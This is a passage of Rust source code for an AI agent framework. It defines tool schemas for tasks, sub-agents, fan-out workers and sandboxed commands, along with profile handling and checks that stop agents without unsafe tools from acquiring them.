                "description": "Delete a knowledge base note that's wrong or no longer relevant, by id.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "id": {"type": "integer"}
                    },
                    "required": ["id"],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "plan_update".to_string(),
        tool_plan_update,
        r#"
        {
            "type": "function",
            "function": {
                "name": "plan_update",
                "description": "Create or update your plan for the current multi-step task. Always pass the complete list - it replaces the previous plan. Use it for tasks with three or more distinct steps: write the steps out before starting, mark one item in_progress while working on it, and mark it completed as soon as it's done. The plan is shown to the user as progress. It is cleared automatically once every item is completed.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "items": {
                            "type": "array",
                            "description": "The full plan, in order",
                            "items": {
                                "type": "object",
                                "properties": {
                                    "content": {
                                        "type": "string",
                                        "description": "What this step does, in a few words"
                                    },
                                    "status": {
                                        "type": "string",
                                        "enum": ["pending", "in_progress", "completed"],
                                        "description": "At most one item may be in_progress"
                                    }
                                },
                                "required": ["content", "status"],
                                "additionalProperties": false
                            }
                        }
                    },
                    "required": [
                        "items"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "plan_get".to_string(),
        tool_plan_get,
        r#"
        {
            "type": "function",
            "function": {
                "name": "plan_get",
                "description": "Get your current plan (see plan_update), e.g. to pick up where you left off after the conversation was summarized.",
                "parameters": {
                    "type": "object",
                    "properties": {},
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "task_create".to_string(),
        tool_task_create,
        r#"
        {
            "type": "function",
            "function": {
                "name": "task_create",
                "description": "Schedule a task: on a cron schedule (cron_expression), once after a delay (delay_seconds, preferred for relative times) or at a time (run_at), or right away if none is given. The command is either an instruction in plain language (e.g. \"tell the user a joke\", \"summarize today's commits\"), which the agent carries out as a new turn of its conversation as soon as it's idle, or a JSON tool call run directly without the AI, e.g. {\"tool\": \"run_command\", \"arguments\": {\"command\": \"echo hello\"}}. To do work now, in parallel, use fan_out or spawn_agent instead: a task waits for an agent to be free. task_wait waits for tasks run by others.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "name": {"type": "string", "description": "Name for the task"},
                        "command": {"type": "string", "description": "What to do when it fires: an instruction, or a JSON tool call"},
                        "description": {"type": "string", "description": "What the task is for"},
                        "agent_name": {"type": "string", "description": "The agent that runs it (default: you, unless a profile is given)"},
                        "profile": {"type": "string", "description": "For an instruction: run it on a new agent made from this profile (one listed in your system prompt), by a worker that has it, instead of on an agent"},
                        "cwd": {"type": "string", "description": "The directory it runs in. Default: the one you work in. Only an agent with the unsafe tools can choose another"},
                        "cron_expression": {"type": "string", "description": "7 fields: 'sec min hour day_of_month month day_of_week year', e.g. '0 30 9 * * Mon-Fri *' for 9:30 every weekday"},
                        "max_runs": {"type": "integer", "description": "With cron_expression: stop after this many runs"},
                        "delay_seconds": {"type": "integer", "description": "Run once, this many seconds from now"},
                        "run_at": {"type": "string", "description": "Run once at this RFC 3339 time, e.g. 2026-10-03T08:00:00Z"},
                        "depends_on": {"type": "array", "items": {"type": "integer"}, "description": "Ids of tasks that must finish successfully first; it fails if one of them fails"}
                    },
                    "required": ["name", "command"],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "task_list".to_string(),
        tool_task_list,
        r#"
        {
            "type": "function",
            "function": {
                "name": "task_list",
                "description": "List scheduled tasks with their status and last outcome - all of them, an agent's, or only the ones due to run now - or get one task by id.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "id": {"type": "integer", "description": "Get just this task"},
                        "agent_name": {"type": "string", "description": "Only this agent's tasks"},
                        "profile": {"type": "string", "description": "Only tasks that run on this profile"},
                        "due": {"type": "boolean", "description": "Only tasks due to run now"}
                    },
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "task_delete".to_string(),
        tool_task_delete,
        r#"
        {
            "type": "function",
            "function": {
                "name": "task_delete",
                "description": "Delete a scheduled task by its ID.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "id": {
                            "type": "number",
                            "description": "ID of the task to delete"
                        }
                    },
                    "required": [
                        "id"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "task_wait".to_string(),
        tool_task_wait,
        r#"
        {
            "type": "function",
            "function": {
                "name": "task_wait",
                "description": "Wait for tasks to finish their next run, and get how each went - e.g. tasks you created with task_create for other agents. Not for a task that runs on you: it can't start until you're idle.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "ids": {"type": "array", "items": {"type": "integer"}, "description": "IDs of the tasks"},
                        "timeout_seconds": {"type": "integer", "description": "Give up after this long (default 600)"}
                    },
                    "required": ["ids"],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "task_assign".to_string(),
        tool_task_assign,
        r#"
        {
            "type": "function",
            "function": {
                "name": "task_assign",
                "description": "Change where a task that isn't running or done yet runs: on an existing agent (agent_name), on a new agent made from a profile (profile, instructions only), or with neither on whichever agent is free first.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "id": {"type": "integer", "description": "ID of the task"},
                        "agent_name": {"type": "string", "description": "Run it on this agent"},
                        "profile": {"type": "string", "description": "Run it on a new agent made from this profile"}
                    },
                    "required": ["id"],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "task_set_enabled".to_string(),
        tool_task_set_enabled,
        r#"
        {
            "type": "function",
            "function": {
                "name": "task_set_enabled",
                "description": "Disable a scheduled task (one that's running finishes its current run first), or re-enable a disabled one. A task that's done (a one-shot that ran, or a cron task that reached max_runs) can't be re-enabled.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "id": {
                            "type": "number",
                            "description": "ID of the task"
                        },
                        "enabled": {
                            "type": "boolean",
                            "description": "true to enable, false to disable"
                        }
                    },
                    "required": [
                        "id",
                        "enabled"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    // Like run_command: which version an agent gets depends on whether it
    // has the unsafe tools - without them, only agents without them too.
    let send_message_description = if unsafe_tools {
        "Send a message to another agent. The message will appear in the target agent's session and trigger a response."
    } else {
        "Send a message to another agent without the unsafe tools - agents that have them can't be messaged with this. The message will appear in the target agent's session and trigger a response."
    };
    append_tool(
        &mut tools,
        "send_message".to_string(),
        if unsafe_tools {
            tool_send_message
        } else {
            tool_send_message_safe
        },
        serde_json::json!({
            "type": "function",
            "function": {
                "name": "send_message",
                "description": send_message_description,
                "parameters": {
                    "type": "object",
                    "properties": {
                        "to": {
                            "type": "string",
                            "description": "Name of the target agent to send the message to"
                        },
                        "message": {
                            "type": "string",
                            "description": "The message content to send"
                        }
                    },
                    "required": ["to", "message"],
                    "additionalProperties": false
                }
            }
        })
        .to_string(),
    );

    append_tool(
        &mut tools,
        "spawn_agent".to_string(),
        tool_spawn_agent,
        r#"
        {
            "type": "function",
            "function": {
                "name": "spawn_agent",
                "description": "Start a sub-agent on a task in the background and carry on: its result arrives later, as a message, whenever it's done - or collect it with agent_wait. Use it for long or open-ended work you don't need to wait for. To run the same task over many items and get all the results back together, use fan_out instead.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "name": {
                            "type": "string",
                            "description": "Name for the sub-agent (used for display and identification)"
                        },
                        "prompt": {
                            "type": "string",
                            "description": "The task or question for the sub-agent to work on"
                        },
                        "timeout_seconds": {
                            "type": "integer",
                            "description": "Stop it if it's still working after this many seconds"
                        },
                        "max_requests": {
                            "type": "integer",
                            "description": "Stop it once it has made this many requests to the model"
                        },
                        "profile": {
                            "type": "string",
                            "description": "Make a new sub-agent from this profile (one listed in your system prompt): its model, endpoint, parameters such as reasoning effort, and tools"
                        },
                        "unsafe_tools": {
                            "type": "boolean",
                            "description": "Give it the unsafe tools (unsandboxed commands, web access) or not. Default: as you. Only an agent that has them can give them"
                        },
                        "cwd": {
                            "type": "string",
                            "description": "Where it works (an existing directory). Default: where you do. Only an agent with the unsafe tools can choose another"
                        },
                        "result_schema": {
                            "type": "object",
                            "description": "Ask for a structured result: the data fields it must report, with their types, e.g. {\"severity\": \"string\", \"files\": \"array\"}"
                        },
                        "context": {
                            "type": "object",
                            "description": "Hand it context up front: {\"notes\": [knowledge base note titles or ids], \"files\": [paths]}",
                            "properties": {
                                "notes": {"type": "array", "items": {"type": "string"}},
                                "files": {"type": "array", "items": {"type": "string"}}
                            },
                            "additionalProperties": false
                        }
                    },
                    "required": [
                        "name",
                        "prompt"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "agent_cancel".to_string(),
        tool_agent_cancel,
        r#"
        {
            "type": "function",
            "function": {
                "name": "agent_cancel",
                "description": "Stop a running sub-agent you started (directly, or through your sub-agents). Its result then says it was cancelled.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "name": {"type": "string", "description": "The sub-agent's name"}
                    },
                    "required": ["name"],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "agent_wait".to_string(),
        tool_agent_wait,
        r#"
        {
            "type": "function",
            "function": {
                "name": "agent_wait",
                "description": "Wait for sub-agents you spawned to finish and get their results together - all of them, the ones named, or (any: true) just the first to finish. Results you collect this way aren't also sent to you as messages. Anything still running when the timeout passes is listed as still running.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "names": {"type": "array", "items": {"type": "string"}, "description": "Only these sub-agents (default: all of yours with results not yet collected)"},
                        "any": {"type": "boolean", "description": "Return as soon as one of them finishes"},
                        "timeout_seconds": {"type": "integer", "description": "Stop waiting after this long (default 600)"}
                    },
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "report_result".to_string(),
        tool_report_result,
        r#"
        {
            "type": "function",
            "function": {
                "name": "report_result",
                "description": "When you're a sub-agent, a fan-out worker or running a scheduled task: once you're done, report the outcome of the work you were given - whether it succeeded or failed, a summary, and any data asked for. Call it once, at the end - not for progress. This is what the agent waiting on you (or the task record) gets, so report a failure as failed rather than describing it in a successful answer.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "status": {"type": "string", "enum": ["succeeded", "failed"]},
                        "summary": {"type": "string", "description": "What you found or did, or why it failed"},
                        "data": {"type": "object", "description": "Structured results, with the fields you were asked for"}
                    },
                    "required": ["status", "summary"],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "fan_out".to_string(),
        fan_out::tool_fan_out,
        r#"
        {
            "type": "function",
            "function": {
                "name": "fan_out",
                "description": "Run the same task for many items at once - e.g. review each of these files, answer this question for each module - each in its own worker agent, and wait for all their results, which come back together, in item order, as this tool's result. (For one long task to run in the background while you carry on, use spawn_agent.) Workers see only their own item and the prompt, and by default can only use read-only tools (reading files, searching, lsp), so have them report findings and make any edits yourself afterwards.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "items": {
                            "type": "array",
                            "items": {"type": "string"},
                            "description": "What to run the task for, one worker each (at most 1000), e.g. file paths."
                        },
                        "prompt": {
                            "type": "string",
                            "description": "The task for each worker. {item} is replaced by the worker's item (otherwise the item is appended). Say exactly what the result should contain."
                        },
                        "max_parallel": {
                            "type": "integer",
                            "description": "How many workers run at the same time (default 32, at most 256)."
                        },
                        "profile": {
                            "type": "string",
                            "description": "Run the workers with this profile's settings (one listed in your system prompt): model, endpoint, parameters such as reasoning effort, and the tools they may have."
                        },
                        "tools": {
                            "type": "array",
                            "items": {"type": "string"},
                            "description": "Tools the workers may use, by name, instead of the default read-only ones. Workers that write files can overwrite each other's changes."
                        }
,
                        "result_schema": {
                            "type": "object",
                            "description": "Ask each worker for a structured result: the data fields it must report, with their types, e.g. {\"duplicate\": \"boolean\", \"reason\": \"string\"}"
                        },
                        "context": {
                            "type": "object",
                            "description": "Hand every worker context up front: {\"notes\": [knowledge base note titles or ids], \"files\": [paths]}",
                            "properties": {
                                "notes": {"type": "array", "items": {"type": "string"}},
                                "files": {"type": "array", "items": {"type": "string"}}
                            },
                            "additionalProperties": false
                        }
                    },
                    "required": ["items", "prompt"],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    // run_command is always available: sandboxed via bubblewrap (no network,
    // read-only system, only the current directory writable) unless
    // --unsafe-tools grants it full, unrestricted access.
    if unsafe_tools {
        append_tool(
            &mut tools,
            "run_command".to_string(),
            tool_run_command,
            r#"
        {
            "type": "function",
            "function": {
                "name": "run_command",
                "description": "Run a command and return results in JSON format. Returns {\"stdout\": string, \"stderr\": string, \"exit_code\": number|null, \"success\": boolean}. Commands do not fail on non-zero exit codes.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "command": {
                            "type": "string",
                            "description": "Command to execute, it must be the name of the executable only, e.g. /usr/bin/ls"
                        },
                        "args": {
                            "type": "array",
                            "items": {
                                "type": "string"
                            },
                            "description": "Additional arguments to pass to the command after the executable path, e.g. [\"-l\", \"-a\"]"
                        }
                    },
                    "required": [
                        "command"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
            .to_string(),
        );
    } else {
        append_tool(
            &mut tools,
            "run_command".to_string(),
            tool_run_command_sandboxed,
            r#"
        {
            "type": "function",
            "function": {
                "name": "run_command",
                "description": "Run a command inside a restricted sandbox (bubblewrap): no network access, the system is read-only, and only the current directory is writable - commands needing network access or writing elsewhere will fail. Returns results in JSON format: {\"stdout\": string, \"stderr\": string, \"exit_code\": number|null, \"success\": boolean}. Commands do not fail on non-zero exit codes.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "command": {
                            "type": "string",
                            "description": "Command to execute: an absolute path (e.g. /usr/bin/ls), a path relative to the current directory (e.g. ./build.sh), or a program name looked up on PATH (e.g. ls). It must be inside /usr, /lib, /lib64 or the current directory to be runnable in the sandbox"
                        },
                        "args": {
                            "type": "array",
                            "items": {
                                "type": "string"
                            },
                            "description": "Additional arguments to pass to the command after the executable path, e.g. [\"-l\", \"-a\"]"
                        }
                    },
                    "required": [
                        "command"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
            .to_string(),
        );
    }

    if !unsafe_tools {
        // What only an agent with the unsafe tools may ask for isn't
        // offered: a model shown `unsafe_tools` sets it.
        for name in [
            "agent_create",
            "agent_configure",
            "spawn_agent",
            "task_create",
        ] {
            drop_tool_params(&mut tools, name, &["unsafe_tools", "cwd"]);
        }
        if let Some(allowed_list) = allowed {
            tools.retain(|name, _| allowed_list.iter().any(|a| a == name));
        }
        return tools;
    }

    append_tool(
        &mut tools,
        "fetch_web_content".to_string(),
        tool_fetch_web_content,
        r#"
        {
            "type": "function",
            "function": {
                "name": "fetch_web_content",
                "description": "Fetch content from a web URL. Returns JSON with URL, status code, content type, headers, and the actual content. Supports HTTP/HTTPS URLs with configurable timeout and redirect handling.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": {
                            "type": "string",
                            "description": "The HTTP/HTTPS URL to fetch content from"
                        },
                        "timeout_seconds": {
                            "type": "number",
                            "description": "Request timeout in seconds (default: 30)"
                        },
                        "follow_redirects": {
                            "type": "boolean",
                            "description": "Whether to follow HTTP redirects (default: true)"
                        },
                        "max_content_length": {
                            "type": "number",
                            "description": "Maximum content length in bytes (default: 10MB)"
                        }
                    },
                    "required": [
                        "url"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    if let Some(allowed_list) = allowed {
        tools.retain(|name, _| allowed_list.iter().any(|a| a == name));
    }

    debug!("Tools initialization completed with {} tools", tools.len());
    tools
}

/// Starting messages for a new chat/agent: intentionally empty. Only what
/// the user explicitly adds - via `/system`, a per-agent `system_prompt`
/// config, or system-context files passed to `prompt` - becomes a system
/// message; nothing is injected by default.
fn initialize_chat_messages(tools: &ToolsCollection, opts: &Opts) -> Vec<Message> {
    let uses_profiles = ["spawn_agent", "fan_out", "task_create"]
        .iter()
        .any(|t| tools.contains_key(*t));
    match profiles_overview(&opts.profiles) {
        Some(overview) if uses_profiles => vec![make_message("system", overview)],
        _ => vec![],
    }
}

/// A named set of agent settings, from the config file's "profiles": an
/// agent made from one (`spawn_agent`, `fan_out`, `faber chat --profile`,
/// a task's `profile`) gets a copy of them as its own config, so later
/// changes to the profile don't affect it.
#[derive(Deserialize, Serialize, Debug, Clone, Default, PartialEq)]
#[serde(deny_unknown_fields)]
struct Profile {
    /// What it's for, shown to the model choosing one.
    #[serde(default)]
    description: Option<String>,
    #[serde(default)]
    model: Option<String>,
    #[serde(default)]
    endpoint: Option<String>,
    /// Path to the file holding the API key.
    #[serde(default)]
    api_key: Option<String>,
    #[serde(default)]
    max_tokens: Option<u32>,
    #[serde(default)]
    context_window: Option<u32>,
    /// Request parameters, e.g. {"reasoning_effort": "low", "temperature": 0.2},
    /// over the ones given with --parameter.
    #[serde(default)]
    parameters: Option<serde_json::Map<String, serde_json::Value>>,
    /// Added to the agent's system prompt.
    #[serde(default)]
    system_prompt: Option<String>,
    /// The only built-in tools it may use - of those the session has, so a
    /// profile can't add unsafe tools to a session without them.
    #[serde(default)]
    tools: Option<Vec<String>>,
    /// The MCP servers whose tools it gets, by name (see "mcp_servers").
    #[serde(default)]
    mcp_servers: Option<Vec<String>>,
}

impl Profile {
    /// The agent config an agent made from this profile, `name`, gets.
    fn agent_config(&self, name: &str) -> db::AgentConfig {
        db::AgentConfig {
            model: self.model.clone(),
            endpoint: self.endpoint.clone(),
            system_prompt: self.system_prompt.clone(),
            api_key: self.api_key.clone(),
            max_tokens: self.max_tokens,
            context_window: self.context_window,
            parameters: self.parameters.clone(),
            tools: self.tools.clone(),
            profile: Some(name.to_string()),
            // Profiles never grant unsafe tools (see `child_unsafe`), nor
            // pick where an agent works (see `child_cwd`).
            unsafe_tools: None,
            cwd: None,
            mcp_servers: self.mcp_servers.clone(),
        }
    }
}

type Profiles = HashMap<String, Profile>;

/// An agent's settings as labelled lines, the model always (`-` for the
/// session's) and the rest only when set.
fn agent_config_lines(config: &db::AgentConfig) -> Vec<(&'static str, String)> {
    let mut lines = vec![
        (
            "Profile",
            config.profile.clone().unwrap_or_else(|| "-".to_string()),
        ),
        (
            "Model",
            config.model.clone().unwrap_or_else(|| "-".to_string()),
        ),
    ];
    let optional = [
        ("Endpoint", config.endpoint.clone()),
        ("API key", config.api_key.clone()),
        ("Max tokens", config.max_tokens.map(|n| n.to_string())),
        ("Context", config.context_window.map(|n| n.to_string())),
        (
            "Parameters",
            config.parameters.as_ref().map(|p| {
                p.iter()
                    .map(|(k, v)| format!("{}={}", k, v))
                    .collect::<Vec<_>>()
                    .join(" ")
            }),
        ),
        ("Tools", config.tools.as_ref().map(|t| t.join(", "))),
        ("Working dir", config.cwd.clone()),
        (
            "Unsafe tools",
            config
                .unsafe_tools
                .map(|u| if u { "yes" } else { "no" }.to_string()),
        ),
        (
            "System prompt",
            config.system_prompt.as_deref().map(|p| first_line(p, 80)),
        ),
    ];
    lines.extend(
        optional
            .into_iter()
            .filter_map(|(label, value)| value.map(|v| (label, v))),
    );
    lines
}

/// `faber profiles`: the config file's profiles, and what each sets.
fn profiles_command(
    opts: &Opts,
    db: &Option<Arc<dyn DbBackend>>,
    action: Option<&ProfilesAction>,
) -> Result<(), Box<dyn Error>> {
    let need_db = || {
        db.as_ref().ok_or(
            "No database configured: set 'db_path' in your config file, or use --db-path or --server.",
        )
    };
    match action {
        Some(ProfilesAction::Set { name, settings }) => {
            if opts.profiles.contains_key(name) {
                return Err(
                    format!("profile '{}' is in the config file: change it there", name).into(),
                );
            }
            let db = need_db()?;
            let current = db
                .list_profiles()?
                .into_iter()
                .find(|(n, _)| n == name)
                .and_then(|(_, v)| serde_json::from_value::<Profile>(v).ok())
                .unwrap_or_default();
            let profile = settings.apply(current)?;
            validate_profiles(&Profiles::from([(name.clone(), profile.clone())]))?;
            db.set_profile(name, &serde_json::to_value(&profile)?)?;
            println!("Profile '{}' saved in the database.", name);
            return Ok(());
        }
        Some(ProfilesAction::Delete { name }) => {
            if opts.profiles.contains_key(name) {
                return Err(
                    format!("profile '{}' is in the config file: remove it there", name).into(),
                );
            }
            if !need_db()?.delete_profile(name)? {
                return Err(format!("no profile '{}' in the database", name).into());
            }
            println!("Profile '{}' removed.", name);
            return Ok(());
        }
        None => {}
    }
    let profiles = session_profiles(opts, db.as_deref());
    if profiles.is_empty() {
        println!(
            "No profiles: add them under \"profiles\" in the config file, or with `faber profiles set`."
        );
        return Ok(());
    }
    let mut names: Vec<&String> = profiles.keys().collect();
    names.sort();
    for name in names {
        let profile = &profiles[name];
        let source = if opts.profiles.contains_key(name) {
            "config file"
        } else {
            "database"
        };
        println!("{} ({})", name, source);
        if let Some(description) = &profile.description {
            println!("  {}", description);
        }
        for (label, value) in agent_config_lines(&profile.agent_config(name))
            .into_iter()
            .skip(1)
        {
            println!("  {:<13} {}", format!("{}:", label), value);
        }
    }
    Ok(())
}

/// The profiles the session behind `ctx` has, if any.
fn ctx_profiles(ctx: &ToolContext) -> Arc<Profiles> {
    ctx.extra
        .as_ref()
        .and_then(|e| e.downcast_ref::<SubAgentContext>())
        .map(|sa| sa.profiles.clone())
        .unwrap_or_default()
}

/// The profile called `name`, or an error naming the ones there are.
/// The profile a model asked for, as one: none for an empty name, or for
/// "default" when no profile has that name - models reach for it when
/// they mean "no particular one".
pub(crate) fn requested_profile(profiles: &Profiles, name: Option<String>) -> Option<String> {
    name.filter(|n| !n.trim().is_empty())
        .filter(|n| n != "default" || profiles.contains_key(n))
}

/// The tools' schemas without their `profile` parameter, when there are
/// no profiles to pick from: offered one anyway, a model makes a name up.
fn without_profile_params(mut tools: ToolsCollection) -> ToolsCollection {
    for tool in tools.values_mut() {
        let Ok(mut schema) = serde_json::from_str::<serde_json::Value>(&tool.schema) else {
            continue;
        };
        let removed = schema["function"]["parameters"]["properties"]
            .as_object_mut()
            .and_then(|props| props.remove("profile"));
        if removed.is_some() {
            if let Some(required) = schema["function"]["parameters"]["required"].as_array_mut() {
                required.retain(|r| r != "profile");
            }
            tool.schema = schema.to_string();
        }
    }
    tools
}

/// The profiles a session can make agents from: the database's, shared by
/// every session using it, with its own config file's over them.
fn session_profiles(opts: &Opts, db: Option<&dyn DbBackend>) -> Profiles {
    let mut profiles = Profiles::new();
    for (name, settings) in db
        .and_then(|db| db.list_profiles().ok())
        .unwrap_or_default()
    {
        match serde_json::from_value::<Profile>(settings) {
            Ok(profile) => {
                profiles.insert(name, profile);
            }
            Err(e) => warn!("Ignoring profile '{}' in the database: {}", name, e),
        }
    }
    profiles.extend(opts.profiles.clone());
    profiles
}

/// `opts`, with the database's profiles too (see `session_profiles`), as
/// a session sees them when it starts.
fn with_db_profiles(opts: &Opts, db: &Option<Arc<dyn DbBackend>>) -> Opts {
    let mut opts = opts.clone();
    opts.profiles = session_profiles(&opts, db.as_deref());
    opts
}

fn find_profile<'a>(profiles: &'a Profiles, name: &str) -> Result<&'a Profile, String> {
    profiles.get(name).ok_or_else(|| {
        let mut names: Vec<&str> = profiles.keys().map(String::as_str).collect();
        names.sort();
        if names.is_empty() {
            format!("no profile '{}': none are configured", name)
        } else {
            format!("no profile '{}': use one of {}", name, names.join(", "))
        }
    })
}

/// Checks the config file's profiles: sensible names, and tools that exist.
fn validate_profiles(profiles: &Profiles) -> Result<(), String> {
    let known = initialize_tools(true, None);
    for (name, profile) in profiles {
        if name.is_empty()
            || !name
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.')
        {
            return Err(format!(
                "profile name '{}': use letters, digits, '-', '_' and '.'",
                name
            ));
        }
        for tool in profile.tools.iter().flatten() {
            if !known.contains_key(tool) {
                return Err(format!("profile '{}': unknown tool '{}'", name, tool));
            }
        }
    }
    Ok(())
}

/// What the model is told about the profiles it can pick from, if any.
fn profiles_overview(profiles: &Profiles) -> Option<String> {
    if profiles.is_empty() {
        return None;
    }
    let mut names: Vec<&String> = profiles.keys().collect();
    names.sort();
    let mut text = "Agent profiles you can run work on, with the `profile` parameter of spawn_agent, fan_out and task_create:".to_string();
    for name in names {
        let profile = &profiles[name];
        let mut details = Vec::new();
        if let Some(model) = &profile.model {
            details.push(format!("model {}", model));
        }
        for (key, value) in profile.parameters.iter().flatten() {
            details.push(format!("{} {}", key, value));
        }
        text.push_str(&format!("\n- {}", name));
        if let Some(description) = &profile.description {
            text.push_str(&format!(": {}", description));
        }
        if !details.is_empty() {
            text.push_str(&format!(" ({})", details.join(", ")));
        }
    }
    Some(text)
}

/// Makes `agent` from `profile` (called `name`), or re-applies it to an
/// existing one: its config becomes a copy of the profile's.
fn apply_profile(
    db: &dyn DbBackend,
    agent: &str,
    name: &str,
    profile: &Profile,
) -> Result<db::AgentConfig, Box<dyn Error>> {
    if db.get_agent(agent)?.is_none() {
        let description = profile
            .description
            .clone()
            .unwrap_or_else(|| format!("Made from profile '{}'", name));
        db.create_agent(agent, &description)?;
    }
    let mut config = profile.agent_config(name);
    // Not a profile's to give or take: see `child_unsafe`, `child_cwd`.
    let current = db.get_agent_config(agent)?;
    config.unsafe_tools = current.unsafe_tools;
    config.cwd = current.cwd;
    db.set_agent_config(agent, &config)?;
    Ok(config)
}

/// Whether an agent with `config` that a session runs as its own - a
/// chat's, a worker's - has the unsafe tools: if its config says so, or
/// the session was started with `--unsafe-tools`. Agents made by others
/// (`spawn_agent`, a worker's task agents) always have it set.
/// The MCP servers' tools a session's own agent gets - a chat's, a
/// worker's, `faber prompt`'s: those its config lists, else every server
/// the session defines; and those `--mcp-server` named either way. None
/// with `--no-tools`.
fn session_mcp(
    manager: &Option<Arc<faber::mcp::McpManager>>,
    config: &db::AgentConfig,
    opts: &Opts,
) -> Option<faber::mcp::McpAccess> {
    let manager = manager.as_ref()?;
    let mut servers = match (&config.mcp_servers, opts.no_tools) {
        (_, true) => Vec::new(),
        (Some(listed), false) => listed.clone(),
        (None, false) => manager.server_names(),
    };
    if !opts.no_tools {
        for name in &opts.mcp_granted {
            if !servers.contains(name) {
                servers.push(name.clone());
            }
        }
    }
    Some(mcp_access(manager, servers))
}

/// The MCP servers' tools any other agent gets - a sub-agent, a task's or
/// a fan-out's: only those its config lists (from its profile, or set by
/// the user).
fn agent_mcp(
    manager: Option<&Arc<faber::mcp::McpManager>>,
    config: &db::AgentConfig,
) -> Option<faber::mcp::McpAccess> {
    let manager = manager?;
    Some(mcp_access(
        manager,
        config.mcp_servers.clone().unwrap_or_default(),
    ))
}

fn mcp_access(
    manager: &Arc<faber::mcp::McpManager>,
    servers: Vec<String>,
) -> faber::mcp::McpAccess {
    let defined = manager.server_names();
    for name in &servers {
        if !defined.contains(name) {
            warn!(
                "No MCP server '{}' is defined here: its tools are left out",
                name
            );
        }
    }
    faber::mcp::McpAccess::new(manager.clone(), servers)
}

fn session_agent_unsafe(opts: &Opts, config: &db::AgentConfig) -> bool {
    opts.unsafe_tools || config.unsafe_tools == Some(true)
}

/// Whether an agent made by one that's `parent_unsafe` - asking for
/// `requested`, or else like its parent - gets the unsafe tools. Only an
/// agent that has them can hand them on.
fn child_unsafe(parent_unsafe: bool, requested: Option<bool>) -> Result<bool, String> {
    match requested {
        Some(true) if !parent_unsafe => Err(
            "an agent without unsafe tools can't make one with them: only the user, or an agent \
             that has them, can"
                .to_string(),
        ),
        Some(requested) => Ok(requested),
        None => Ok(parent_unsafe),
    }
}

/// Whether `agent` has the unsafe tools now - for good, or for the
/// session running it (see `db::has_unsafe_tools`).
fn agent_is_unsafe(db: &dyn DbBackend, agent: &str) -> Result<bool, Box<dyn Error>> {
    let Some(row) = db.get_agent(agent)? else {
        return Ok(false);
    };
    let config = db.get_agent_config(agent)?;
    let marker = db.get_agent_data(agent, db::SESSION_UNSAFE_KEY)?;
    Ok(db::has_unsafe_tools(
        &row,
        &config,
        marker.as_deref(),
        chrono::Utc::now(),
    ))
}

/// Records that session `session_id` runs `agent` with the unsafe tools,
/// for as long as it does - so other agents can tell (`agent_is_unsafe`).
fn mark_session_unsafe(db: &dyn DbBackend, agent: &str, session_id: &str) {
    let current = db
        .get_agent_data(agent, db::SESSION_UNSAFE_KEY)
        .ok()
        .flatten();
    if current.as_deref() != Some(session_id) {
        let _ = db.set_agent_data(agent, db::SESSION_UNSAFE_KEY, session_id);
    }
}

/// Refuses if a safe agent (`ctx`) would change or take over `agent`, one
/// with the unsafe tools - that would be a way to get them.
fn check_may_change(ctx: &ToolContext, db: &dyn DbBackend, agent: &str) -> Result<(), String> {
    if ctx.unsafe_tools {
        return Ok(());
    }
    if agent_is_unsafe(db, agent).map_err(|e| e.to_string())? {
        return Err(format!(
            "'{}' has unsafe tools: an agent without them can't change it",
            agent
        ));
    }
    // Only its own sub-agents: any other may be the user's, another
    // session's, or one that runs with the unsafe tools when it's next
    // started - which a planted setting would then turn to its maker's.
    if !made_by(db, agent, ctx.agent_name.as_deref()).map_err(|e| e.to_string())? {
        return Err(format!(
            "'{}' isn't one of the agents you made: an agent without the unsafe tools can only \
             change, delete or run those",
            agent
        ));
    }
    Ok(())
}

/// Refuses a change to `task` by an agent without the unsafe tools unless
/// the task is one such an agent made (`run_safe`): the user's tasks, and
/// unsafe agents', aren't for it to enable, move or delete.
fn check_may_change_task(ctx: &ToolContext, task: &db::TaskRow) -> Result<(), String> {
    if ctx.unsafe_tools || task.run_safe {
        return Ok(());
    }
    Err(format!(
        "task #{} was made by the user or an agent with the unsafe tools: an agent without them \
         can't change it",
        task.id
    ))
}

/// What an agent sees of `task`: one without the unsafe tools sees only
/// the name and state of tasks such agents didn't make - not what they
/// run, nor what came of it.
